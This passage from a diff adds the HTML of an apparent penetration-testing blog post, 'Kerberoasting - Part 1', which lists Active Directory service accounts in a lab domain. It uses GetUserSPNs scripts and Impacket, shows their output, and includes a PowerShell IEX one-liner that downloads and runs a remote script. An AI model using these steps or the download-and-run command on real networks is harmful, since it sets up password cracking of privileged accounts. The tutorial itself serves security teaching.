+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\temp&gt; cscript GetUserSPNs.vbs
+</span></span><span class="line"><span class="cl">Microsoft (R) Windows Script Host Version 5.8
+</span></span><span class="line"><span class="cl">Copyright (C) Microsoft Corporation. All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">CN=Uber User,CN=Users,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">User Logon: uberuser
+</span></span><span class="line"><span class="cl">-- http/win10.sittingduck.info
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">CN=krbtgt,CN=Users,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">User Logon: krbtgt
+</span></span><span class="line"><span class="cl">-- kadmin/changepw
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">CN=MSSQL Service Admin,CN=Users,DC=sittingduck,DC=info
+</span></span><span class="line"><span class="cl">User Logon: sqladmin01
+</span></span><span class="line"><span class="cl">-- MSSQLSvc/WIN2K8R2.sittingduck.info
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="getuserspnsps1">GetUserSPNs.ps1</h3>
+<ul>
+<li>Link: <a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener noreffer ">Kerberoast&rsquo;s GetUserSPNs.ps1</a></li>
+</ul>
+<p>I really like this script because it tells you the time the password was last set. This allows for you to make educated selections on which accounts to attack with your password cracking. (More hashes needed to crack, the longer it takes)</p>
+<p>Below I use the <code>IEX</code> (Invoke-Expression) command in PowerShell to download and run the PowerShell script directly from Tim&rsquo;s repository, but you could just as easily upload it and run it.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\&gt; IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercon
+</span></span><span class="line"><span class="cl">tent.com/nidem/kerberoast/master/GetUserSPNs.ps1&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ServicePrincipalNam Name                MemberOf            PasswordLastSet
+</span></span><span class="line"><span class="cl">e
+</span></span><span class="line"><span class="cl">------------------- ----                --------            ---------------
+</span></span><span class="line"><span class="cl">http/win10.sitti... Uber User           CN=Domain Admins... 11/10/2015 11:47...
+</span></span><span class="line"><span class="cl">kadmin/changepw     krbtgt              CN=Denied RODC P... 11/10/2015 6:18:...
+</span></span><span class="line"><span class="cl">MSSQLSvc/WIN2K8R... MSSQL Service Admin                     5/13/2016 7:13:2...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="impacket">Impacket</h3>
+<ul>
+<li>Link: <a href="https://github.com/CoreSecurity/impacket/blob/master/examples/GetUserSPNs.py" target="_blank" rel="noopener noreffer ">Impacket&rsquo;s GetUserSPNs.py</a></li>
+</ul>
+<p>Impacket is a recent addition to the list of tools that perform SPN listing. <a href="https://github.com/CoreSecurity/impacket/pull/153" target="_blank" rel="noopener noreffer ">Pull request #153 - TGS-Response code to work with windows AD</a> was all it took to motivate <a href="https://twitter.com/agsolino" target="_blank" rel="noopener noreffer ">@agsolino</a> into making an example script and while <a href="https://github.com/skelsec/PyKerberoast" target="_blank" rel="noopener noreffer ">PyKerberoast</a> by <a href="https://twitter.com/skelsec" target="_blank" rel="noopener noreffer ">@skelsec</a> came first, it doesn&rsquo;t have a plain &ldquo;list&rdquo; function so I wanted to save it for the extraction post.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">root@wpad:~/impacket/examples# ./GetUserSPNs.py -dc-ip 192.168.168.10 sittingduck.info/notanadmin
+</span></span><span class="line"><span class="cl">Impacket v0.9.15-dev - Copyright 2002-2016 Core Security Technologies
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Password:
+</span></span><span class="line"><span class="cl">ServicePrincipalName                Name        MemberOf                                          PasswordLastSet
+</span></span><span class="line"><span class="cl">----------------------------------  ----------  ------------------------------------------------  -------------------
+</span></span><span class="line"><span class="cl">http/win10.sittingduck.info         uberuser    CN=Domain Admins,CN=Users,DC=sittingduck,DC=info  2015-11-10 23:47:21
+</span></span><span class="line"><span class="cl">MSSQLSvc/WIN2K8R2.sittingduck.info  sqladmin01                                                    2016-05-13 19:13:20
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And that is it for now. We have listed all of the SPNs or just the ones we needed. In Part 2 we will make requests for the SPN tickets we want.</p>
+<h1 id="references">References:</h1>
+<h2 id="tools">Tools</h2>
+<ul>
+<li><a href="https://github.com/nidem/kerberoast" target="_blank" rel="noopener noreffer ">Kerberoast</a></li>
+<li><a href="https://github.com/coresecurity/impacket" target="_blank" rel="noopener noreffer ">Impacket</a></li>
+<li><a href="https://github.com/skelsec/PyKerberoast" target="_blank" rel="noopener noreffer ">PyKerberoast</a></li>
+<li><a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener noreffer ">Github - John the Ripper - Magnumripper</a></li>
+<li><a href="https://github.com/hashcat/oclHashcat" target="_blank" rel="noopener noreffer ">Github - oclHashcat</a></li>
+</ul>
+<h2 id="presentations">Presentations</h2>
+<ul>
+<li>Tim Medin&rsquo;s Slides - [Kicking the Guard Dog of Hades - slides](<a href="https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin%281" target="_blank" rel="noopener noreffer ">https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1</a>).pdf)</li>
+<li>Tim Medin&rsquo;s Video - <a href="https://www.youtube.com/watch?v=PUyhlN-E5MU&amp;feature=youtu.be" target="_blank" rel="noopener noreffer ">Kicking the Guard Dog of Hades - video</a></li>
+</ul>
+<h2 id="other-write-ups">Other write ups</h2>
+<ul>
+<li><a href="http://malwarejake.blogspot.com/2015/11/kerberos-silver-tickets-unique-attacker.html" target="_blank" rel="noopener noreffer ">Jacob Williams (MalwareJake) post about Silver Tickets being using in the wild</a></li>
+<li><a href="https://www.beneaththewaves.net/Projects/Mimikatz_20_-_Brute-Forcing_Service_Account_Passwords.html" target="_blank" rel="noopener noreffer ">Ben Lincoln&rsquo;s writeup on Brute Forcing Service Account Passwords</a></li>
+<li><a href="https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/" target="_blank" rel="noopener noreffer ">Leon Jacob&rsquo;s writeup on Kerberoast</a></li>
+<li><a href="https://adsecurity.org/?p=2293" target="_blank" rel="noopener noreffer ">Sean Metcalf&rsquo;s writeup on Kerberoast</a></li>
+<li><a href="https://adsecurity.org/?page_id=183" target="_blank" rel="noopener noreffer ">Sean Metcalf&rsquo;s SPN directory</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2016-05-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2016/kerberoast-pt1/" data-title="Kerberoasting - Part 1" data-via="mubix" data-hashtags="kerberos,impacket,empire,powershell,spn"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2016/kerberoast-pt1/" data-hashtag="kerberos"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2016/kerberoast-pt1/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2016/kerberoast-pt1/" data-title="Kerberoasting - Part 1"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2016/kerberoast-pt1/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2016/kerberoast-pt1/" data-title="Kerberoasting - Part 1"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2016/kerberoast-pt1/" data-title="Kerberoasting - Part 1"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2016/kerberoast-pt1/" data-title="Kerberoasting - Part 1"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/kerberos/">kerberos</a>,&nbsp;<a href="/tags/impacket/">impacket</a>,&nbsp;<a href="/tags/empire/">empire</a>,&nbsp;<a href="/tags/powershell/">powershell</a>,&nbsp;<a href="/tags/spn/">spn</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2016/blackhat-usa-2016/" class="prev" rel="prev" title="BlackHat USA 2016"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>BlackHat USA 2016</a>
+            <a href="/posts/2016/kerberoast-pt2/" class="next" rel="next" title="Kerberoasting - Part 2">Kerberoasting - Part 2<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
